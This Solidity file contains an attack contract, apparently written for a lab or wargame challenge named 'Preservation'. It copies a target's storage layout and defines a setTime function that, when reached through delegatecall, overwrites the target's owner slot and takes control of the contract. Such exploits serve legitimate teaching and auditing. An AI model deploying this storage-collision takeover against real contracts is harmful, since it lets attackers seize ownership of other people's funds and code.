// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract PreservationAttack {
    uint256 placeholder1;
    uint256 placeholder2;
    address newOwner;

    function setTime(uint256 owner) external {
        newOwner = address(bytes20(uint160(owner)));
    }
}
